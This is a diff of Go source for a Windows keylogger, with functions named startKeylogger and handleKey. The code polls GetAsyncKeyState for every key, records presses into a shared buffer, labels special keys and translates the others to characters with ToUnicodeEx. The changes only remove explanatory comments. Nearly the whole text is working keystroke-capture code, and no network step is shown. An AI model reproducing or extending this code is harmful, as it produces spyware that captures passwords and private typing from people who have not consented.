@@ -21,10 +21,11 @@ var (
 	keylogMutex  sync.Mutex
 )
 
+// Poll key state
 func startKeylogger() {
 	var state [256]byte
 	for {
-		for i := 8; i < 256; i++ { // Start from 8 to skip mouse buttons
+		for i := 8; i < 256; i++ {
 			v, _, _ := procGetAsyncKeyState.Call(uintptr(i))
 			if v&0x8000 != 0 {
 				if state[i] == 0 {
@@ -43,34 +44,32 @@ func handleKey(vkCode int) {
 	keylogMutex.Lock()
 	defer keylogMutex.Unlock()
 
-	// Handle special keys for better readability
 	switch vkCode {
-	case 0x08: // VK_BACK
+	case 0x08:
 		keylogBuffer.WriteString("[BACKSPACE]")
 		return
-	case 0x0D: // VK_RETURN
+	case 0x0D:
 		keylogBuffer.WriteString("\n")
 		return
-	case 0x09: // VK_TAB
+	case 0x09:
 		keylogBuffer.WriteString("[TAB]")
 		return
-	case 0x10, 0xA0, 0xA1: // VK_SHIFT
+	case 0x10, 0xA0, 0xA1:
 		return
-	case 0x11, 0xA2, 0xA3: // VK_CONTROL
+	case 0x11, 0xA2, 0xA3:
 		return
-	case 0x12, 0xA4, 0xA5: // VK_MENU (Alt)
+	case 0x12, 0xA4, 0xA5:
 		return
-	case 0x14: // VK_CAPITAL
+	case 0x14:
 		return
-	case 0x20: // VK_SPACE
+	case 0x20:
 		keylogBuffer.WriteString(" ")
 		return
-	case 0x2E: // VK_DELETE
+	case 0x2E:
 		keylogBuffer.WriteString("[DEL]")
 		return
 	}
 
-	// Try to translate to character
 	var keyboardState [256]byte
 	procGetKeyboardState.Call(uintptr(unsafe.Pointer(&keyboardState[0])))
 
@@ -79,7 +78,7 @@ func handleKey(vkCode int) {
 
 	ret, _, _ := procToUnicodeEx.Call(
 		uintptr(vkCode),
-		uintptr(0), // scan code
+		uintptr(0),
 		uintptr(unsafe.Pointer(&keyboardState[0])),
 		uintptr(unsafe.Pointer(&buf[0])),
 		uintptr(2),
